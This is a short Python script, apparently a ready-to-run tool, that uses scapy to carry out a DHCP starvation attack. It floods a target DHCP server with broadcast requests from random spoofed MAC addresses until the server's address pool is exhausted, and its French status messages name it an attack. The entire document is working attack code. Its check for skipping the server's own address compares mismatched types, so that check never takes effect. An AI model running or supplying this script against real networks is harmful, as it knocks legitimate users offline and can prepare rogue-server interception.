from scapy.all import *
import sys
import time
from ipaddress import ip_network, IPv4Address

conf.checkIPaddr = False

def dhcp_starvation(dhcp_server, network_str):
    
    try:
        while True:
            for i in range(254):
                ip = ".".join(network_str.split(".")[:-1]) + "." + str(i)
                if ip == IPv4Address(dhcp_server):
                    continue

                mac = RandMAC()
                request = (
                    Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(op=1, chaddr=mac) /
                    DHCP(options=[
                        ('message-type', 'request'),
                        ('requested_addr', str(ip)),
                        ('server_id', dhcp_server),
                        ('end')
                    ])
                )
                print(f"Requête DHCP envoyée pour l'adresse IP : {ip}")
                sendp(request, iface=conf.iface, verbose=0)

            time.sleep(3)

    except KeyboardInterrupt:
        print("Arrêt de l'attaque DHCP")

dhcp_server = sys.argv[1]
network = sys.argv[2]

dhcp_starvation(dhcp_server, network)
